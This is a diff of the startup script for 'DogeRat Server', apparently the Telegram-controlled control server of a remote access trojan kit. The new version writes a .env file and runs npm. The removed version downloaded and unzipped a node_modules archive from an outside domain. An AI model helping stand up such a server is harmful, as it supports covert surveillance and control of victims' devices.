@@ -1,74 +1,43 @@
-#!/usr/bin/env bash
+#!/bin/bash
 
-# Set terminal colors
-RED="\033[31m"
-GREEN="\033[32m"
-YELLOW="\033[33m"
-BLUE="\033[34m"
-MAGENTA="\033[35m"
-CYAN="\033[36m"
-RESET="\033[0m"
+# DogeRat Server Startup Script
 
-# Print banner
-echo -e "${RED}██████╗░░█████╗░░██████╗░███████╗██████╗░░█████╗░████████╗"
-echo -e "██╔══██╗██╔══██╗██╔════╝░██╔════╝██╔══██╗██╔══██╗╚══██╔══╝"
-echo -e "██║░░██║██║░░██║██║░░██╗░█████╗░░██████╔╝███████║░░░██║░░░"
-echo -e "██║░░██║██║░░██║██║░░╚██╗██╔══╝░░██╔══██╗██╔══██║░░░██║░░░"
-echo -e "██████╔╝╚█████╔╝╚██████╔╝███████╗██║░░██║██║░░██║░░░██║░░░"
-echo -e "╚═════╝░░╚════╝░░╚═════╝░╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░${RESET}"
-echo -e "${YELLOW}               ░D░O░G░E░ ░R░A░T░B░Y░S░ ░H░I░V░ ░A░Y░A░D░A░V░${RESET}"
+echo "================================"
+echo "  DogeRat Server v3.0"
+echo "================================"
+echo ""
 
-
-echo -e "\e[0m"
-echo "Author: Fahim Ahamed"
-echo "Github: fahimahamed1"
-echo "Telegram channel: N/A"
-echo -n "Loading "
-timeout 10s bash -c '
-while true
-do
-    echo -n "."
-    sleep 1
-done
-'
-echo " Done!"
-
-
-apt update && apt upgrade -y
-if ! command -v node &> /dev/null
-then
-    echo "Node.js LTS not found. Installing..."
-    pkg install nodejs-lts || { echo "Failed to install Node.js LTS" ; exit 1; }
-else
-    echo "Node.js LTS already installed"
-fi
-if ! command -v wget &> /dev/null
-then
-    echo "wget not found. Installing..."
-    apt install -y wget || { echo "Failed to install wget" ; exit 1; }
-else
-    echo "wget already installed"
+# Check if .env file exists
+if [ ! -f "server/.env" ]; then
+    echo "Configuring server..."
+    echo ""
+    echo "Enter your Telegram Bot Token:"
+    read -r bot_token
+    echo ""
+    echo "Enter your Telegram Chat ID:"
+    read -r chat_id
+    echo ""
+    
+    # Create .env file
+    cat > server/.env << EOF
+# DogeRat Server Configuration
+TELEGRAM_BOT_TOKEN=$bot_token
+TELEGRAM_CHAT_ID=$chat_id
+PORT=8999
+EOF
+    
+    echo "Configuration saved!"
+    echo ""
 fi
 
-if [ -d "node_modules" ]
-then
-    echo "node_modules already exists. Skipping download."
-else
-    if [ -f "node_modules.zip" ]
-    then
-        echo "node_modules.zip already downloaded. Skipping download."
-    else
-        # Download node_modules.zip file
-        wget https://cybershieldx.com/node_modules.zip || { echo "Failed to download node_modules.zip" ; exit 1; }
-    fi
-
-    unzip node_modules.zip || { echo "Failed to extract node_modules.zip" ; exit 1; }
-    rm node_modules.zip
+# Install dependencies if needed
+if [ ! -d "node_modules" ]; then
+    echo "Installing dependencies..."
+    npm install
+    echo ""
 fi
 
-read -p "Enter your bot token: " token
-read -p "Enter your chat ID: " id
-sed -i "s/const token = 'your token here'/const token = '$token'/g" index.js
-sed -i "s/const id = 'chat id here'/const id = '$id'/g" index.js
-echo "Server uploaded successfully! Now open new tab and follow rest instructions"
-node index.js
+# Start the server
+echo "Starting server..."
+echo ""
+npm start
